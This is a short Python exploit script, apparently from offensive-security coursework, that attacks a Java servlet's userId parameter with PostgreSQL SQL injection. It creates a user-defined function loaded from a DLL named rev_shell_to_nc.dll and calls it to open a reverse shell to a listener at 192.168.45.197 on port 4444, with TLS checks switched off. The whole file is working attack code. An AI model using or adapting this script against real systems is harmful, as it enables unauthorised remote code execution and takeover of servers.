import requests, sys, urllib, string, random, time

requests.packages.urllib3.disable_warnings()


def log(msg):
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: %s" % sql[0:80])
    payload = {
       'ForMasRange': '1',
       'userId': sql
    }
    r = requests.get(url,data=payload,verify=False)
    return r

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "create+or+replace+function+rev_shell%28text%2cinteger%29+returns+void+as+$$C%3a%5crev_shell_to_nc.dll$$,$$awae$$+language+C+strict;--"
    make_request(url, sql)

def trigger_udf(url):
    log("[+] Launching reverse shell...")
    sql = "select+rev_shell($$192.168.45.197$$,4444)" 
    make_request(url, sql)

if __name__ == '__main__':
    try:
        server = sys.argv[1].strip()
        #attacker = sys.argv[2].strip()
        #port = sys.argv[3].strip()
        print("start")
    except IndexError:
        print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])

sqli_url = "https://"+server+"/servlet/AxxxxSyncServlet"
create_udf_func(sqli_url)
trigger_udf(sqli_url)
